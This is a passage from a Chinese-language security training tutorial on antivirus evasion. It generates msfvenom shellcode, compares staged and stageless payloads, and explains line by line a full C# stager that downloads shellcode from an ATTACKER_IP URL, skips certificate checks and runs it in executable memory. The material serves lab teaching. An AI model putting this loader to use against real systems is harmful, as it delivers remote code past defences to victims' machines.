<p><img decoding="async" loading="lazy" alt="Executing MSF Payload to run calc.exe" src="/assets/images/e90959ae18f71d51d7b8681676029493-2729158f926e99a55c77b5987cd9a8b5.png" width="1240" height="599" class="img_ev3q"></p>
<p>Metasploit 框架提供了许多其他的 shellcode 格式和类型，满足你所有的需求。我们强烈建议你多做实验，通过生成不同的 shellcode 来扩展你的知识。</p>
<p>之前的示例展示了如何生成 shellcode 并在目标机器上执行。当然，你可以复制相同的步骤来创建不同类型的 shellcode，例如 Meterpreter shellcode。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="从-exe-文件生成-shellcode">从 EXE 文件生成 Shellcode<a href="#从-exe-文件生成-shellcode" class="hash-link" aria-label="Direct link to 从 EXE 文件生成 Shellcode" title="Direct link to 从 EXE 文件生成 Shellcode">​</a></h3>
<p>Shellcode 也可以存储在 <code>.bin</code> 文件中，这是一种原始数据格式。在这种情况下，我们可以使用 <code>xxd -i</code> 命令提取其中的 shellcode。</p>
<p>C2 框架提供的 shellcode 通常是原始二进制文件 <code>.bin</code> 格式。如果是这种情况，我们可以使用 Linux 系统命令 <code>xxd</code> 获取二进制文件的十六进制表示。为此，我们执行以下命令：<code>xxd -i</code>。</p>
<p>让我们使用 msfvenom 创建一个原始二进制文件来获取 shellcode：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw &gt; /tmp/example.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: 193 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ file /tmp/example.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/example.bin: data</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后在创建的文件上运行 <code>xxd</code> 命令：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ xxd -i /tmp/example.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned char _tmp_example_bin[] = {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">};</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned int _tmp_example_bin_len = 193;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果我们将输出与之前使用 Metasploit 创建的 shellcode 进行比较，会发现它们是匹配的。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="staged-payloads---分阶段有效载荷">Staged Payloads - 分阶段有效载荷<a href="#staged-payloads---分阶段有效载荷" class="hash-link" aria-label="Direct link to Staged Payloads - 分阶段有效载荷" title="Direct link to Staged Payloads - 分阶段有效载荷">​</a></h2>
<p>为了绕过杀毒软件，我们将找到两种主要的方法来将最终的 shellcode 传递给受害者。根据方法的不同，载荷通常分为<strong>分阶段</strong>和<strong>无阶段</strong>载荷。在这项任务中，我们将探讨这两种方法的区别以及各自的优点。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="无阶段载荷">无阶段载荷<a href="#无阶段载荷" class="hash-link" aria-label="Direct link to 无阶段载荷" title="Direct link to 无阶段载荷">​</a></h3>
<p>无阶段载荷将最终的 shellcode 直接嵌入到自身中。可以将其视为一个打包的应用程序，能够在单一步骤中执行 shellcode。在之前的任务中，我们嵌入了一个可执行文件，该文件嵌入了一个简单的 <code>calc</code> shellcode，这就构成了一个无阶段载荷。</p>
<p><img decoding="async" loading="lazy" alt="Stageless Payload" src="/assets/images/cad28e045fd6fec615b04d731aef7f9a-69f1a0e30eee018d50a0ea506790a6b4.png" width="1298" height="342" class="img_ev3q"></p>
<p>在上面的示例中，当用户执行恶意载荷时，嵌入的 shellcode 将运行，为攻击者提供一个反向 shell。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="分阶段载荷">分阶段载荷<a href="#分阶段载荷" class="hash-link" aria-label="Direct link to 分阶段载荷" title="Direct link to 分阶段载荷">​</a></h3>
<p>分阶段载荷通过使用中介 shellcode 来工作，这些中介 shellcode 作为步骤，最终执行最终的 shellcode。每一个中介 shellcode 被称为<strong>阶段器</strong>（stager），其主要目标是提供一种方法，用于获取最终的 shellcode 并最终执行它。</p>
<p>虽然可能存在具有多个阶段的载荷，但通常的情况是采用两阶段载荷，其中第一阶段，我们称之为<strong>stage0</strong>，是一个连接回攻击者机器的 stub shellcode，用于下载最终要执行的 shellcode。</p>
<p><img decoding="async" loading="lazy" alt="Staged Payload - stage0" src="/assets/images/f92f294a9e599967a0961b4273381be6-45d51c91a030e155aaeddbf5984a5570.png" width="1298" height="342" class="img_ev3q"></p>
<p>一旦获取 stage0 存根，它将把最终的 shellcode 注入到有效负载进程的内存中的某个位置并执行（如下所示）。</p>
<p><img decoding="async" loading="lazy" alt="Staged Payload - Send ReveseShell" src="/assets/images/fd8a98b3cb79cca98a1e0dfd0292ea61-695de12e9832ae53de274a5e7407003b.png" width="1281" height="342" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="分阶段-vs-无阶段">分阶段 vs. 无阶段<a href="#分阶段-vs-无阶段" class="hash-link" aria-label="Direct link to 分阶段 vs. 无阶段" title="Direct link to 分阶段 vs. 无阶段">​</a></h3>
<p>在决定使用哪种类型的有效载荷时，我们必须了解攻击环境。根据具体攻击场景的不同，每种有效载荷类型都有其优缺点。</p>
<p><strong>无阶段有效载荷的优势：</strong></p>
<ul>
<li>生成的可执行文件包含使 shellcode 运行所需的全部内容</li>
<li>无需额外网络连接即可执行。网络交互越少，被 IPS 检测到的概率越低</li>
<li>若攻击目标网络连接受限，可将整个有效载荷封装为单一文件</li>
</ul>
<p><strong>分阶段有效载荷的优势：</strong></p>
<ul>
<li>磁盘占用小。stage0 仅负责下载最终 shellcode，体积通常很小</li>
<li>最终 shellcode 不嵌入可执行文件。若有效载荷被捕获，蓝队只能获取 stage0 存根</li>
<li>最终 shellcode 在内存中加载，永不接触磁盘。降低被杀毒软件检测的可能性</li>
<li>同一 stage0 释放器可复用多种 shellcode，只需替换发送给目标机器的最终 shellcode</li>
</ul>
<p><strong>总结：</strong>
两种类型各有优劣，需结合具体场景选择。无阶段有效载荷更适合边界防护严密的网络环境（无需从互联网下载最终 shellcode）。例如在封闭网络中执行 USB 摆渡攻击时，无阶段有效载荷是更好的选择。</p>
<p>分阶段有效载荷则适合追求最小化本地痕迹的场景。由于最终载荷在内存执行，部分杀毒软件更难检测。同时可避免暴露精心构造的 shellcode（shellcode 全程不会以文件形式出现在目标磁盘）</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="metasploit中的分阶段载荷">Metasploit中的分阶段载荷<a href="#metasploit中的分阶段载荷" class="hash-link" aria-label="Direct link to Metasploit中的分阶段载荷" title="Direct link to Metasploit中的分阶段载荷">​</a></h3>
<p>在使用msfvenom创建有效载荷或在Metasploit中直接使用时，可以选择使用分阶段（staged）或无阶段（stageless）载荷。例如，若需生成反向TCP shell，您会发现存在两个名称略有差异的对应载荷（注意斜杠后的差异）：_/shell</p>
<table><thead><tr><th style="text-align:left">载荷名称</th><th style="text-align:left">类型</th></tr></thead><tbody><tr><td style="text-align:left">windows/x64/shell_reverse_tcp</td><td style="text-align:left">无阶段载荷</td></tr><tr><td style="text-align:left">windows/x64/shell/reverse_tcp</td><td style="text-align:left">分阶段载荷</td></tr></tbody></table>
<p>通常可见相同命名模式适用于其他类型shell。例如，使用无阶段Meterpreter时，我们应选择<code>windows/x64/meterpreter_reverse_tcp</code>而非其分阶段版本<code>windows/x64/meterpreter/reverse_tcp</code>。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="创建自定义分阶段载荷">创建自定义分阶段载荷<a href="#创建自定义分阶段载荷" class="hash-link" aria-label="Direct link to 创建自定义分阶段载荷" title="Direct link to 创建自定义分阶段载荷">​</a></h3>
<p>构建分阶段载荷时，我们采用@mvelazc0提供的分阶段代码稍作修改。完整的分阶段载荷代码可在此处获取，也可通过您Windows设备的<code>C:\Tools\CS Files\StagedPayload.cs</code>路径访问。</p>
<div class="language-c# codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c# codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">using System;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Net;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Text;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Configuration.Install;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Runtime.InteropServices;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Security.Cryptography.X509Certificates;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Program {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [DllImport(&quot;kernel32&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [DllImport(&quot;kernel32&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [DllImport(&quot;kernel32&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static UInt32 MEM_COMMIT = 0x1000;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  public static void Main()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    string url = &quot;https://ATTACKER_IP/shellcode.bin&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Stager(url);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  public static void Stager(string url)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    WebClient wc = new WebClient();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    byte[] shellcode = wc.DownloadData(url);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    IntPtr threadHandle = IntPtr.Zero;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UInt32 threadId = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    IntPtr parameter = IntPtr.Zero;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    WaitForSingleObject(threadHandle, 0xFFFFFFFF);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>该代码初看可能令人望而生畏，但其结构相对简明。让我们逐步解析其功能。</p>
<p>代码首部通过P/Invoke导入若干Windows API函数。我们需要从<code>kernel32.dll</code>中调用的三个核心函数如下：</p>
<table><thead><tr><th style="text-align:left"><strong>WinAPI函数</strong></th><th style="text-align:left"><strong>功能描述</strong></th></tr></thead><tbody><tr><td style="text-align:left"><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc" target="_blank" rel="noopener noreferrer">VirtualAlloc()</a></td><td style="text-align:left">为shellcode分配预留内存空间</td></tr><tr><td style="text-align:left"><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread" target="_blank" rel="noopener noreferrer">CreateThread()</a></td><td style="text-align:left">在当前进程中创建执行线程</td></tr><tr><td style="text-align:left"><a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject" target="_blank" rel="noopener noreferrer">WaitForSingleObject()</a></td><td style="text-align:left">实现线程同步机制，使当前线程等待目标线程执行完毕后再继续运行</td></tr></tbody></table>
<p>以下代码段负责实现这些函数的动态调用：</p>
<div class="language-c# codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c# codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[DllImport(&quot;kernel32&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[DllImport(&quot;kernel32&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[DllImport(&quot;kernel32&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>代码的核心逻辑位于<code>Stager()</code>函数内，该函数实现了分阶段载荷的核心机制。此函数接收一个URL参数，用于指定待执行shellcode的下载地址。</p>
<p>在<code>Stager()</code>函数初始阶段，首先实例化<code>WebClient()</code>对象以便通过Web请求下载shellcode。在实际发起请求前，我们需重写<code>ServerCertificateValidationCallback</code>方法——该方法用于HTTPS请求的SSL证书验证。通过覆写此方法，WebClient将不会对托管payload的Web服务器使用的自签名或无效证书发出警告。完成证书验证设置后，调用<code>DownloadData()</code>方法从指定URL下载shellcode并存入<code>shellcode</code>变量：</p>
<div class="language-c# codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c# codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">WebClient wc = new WebClient();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">byte[] shellcode = wc.DownloadData(url);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦我们的 shellcode 被下载并存储在 <code>shellcode</code> 变量中，我们需要将其复制到可执行内存中，然后再执行它。我们使用 <code>VirtualAlloc()</code> 向操作系统请求一个内存块。请注意，我们请求足够的内存来分配 <code>shellcode.Length</code> 字节，并设置 <code>PAGE_EXECUTE_READWRITE</code> 标志，使分配的内存可执行、可读和可写。当我们的可执行内存块被保留并分配给 <code>codeAddr</code> 变量后，我们使用 <code>Marshal.Copy()</code> 将 <code>shellcode</code> 变量的内容复制到 <code>codeAddr</code> 变量中。</p>
<div class="language-c# codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c# codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在我们已经将 shellcode 复制到一块可执行内存中，我们使用 <code>CreateThread()</code> 函数在当前进程中创建一个新线程来执行我们的 shellcode。传递给 CreateThread 的第三个参数指向 <code>codeAddr</code>，即存储 shellcode 的位置，因此当线程启动时，会像调用普通函数一样运行 shellcode 的内容。第五个参数被设为 0，表示线程将立即开始执行。</p>
<p>线程创建后，我们调用 <code>WaitForSingleObject()</code> 函数，指示当前程序在继续执行之前必须等待该线程执行完毕。这可以防止程序在 shellcode 线程有机会运行之前就提前关闭：</p>
<div class="language-c# codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c# codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">IntPtr threadHandle = IntPtr.Zero;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UInt32 threadId = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IntPtr parameter = IntPtr.Zero;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WaitForSingleObject(threadHandle, 0xFFFFFFFF);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>为了编译代码，我们建议将其复制到一台 Windows 机器上，保存为名为 staged-payload.cs 的文件，并使用以下命令进行编译：</p>
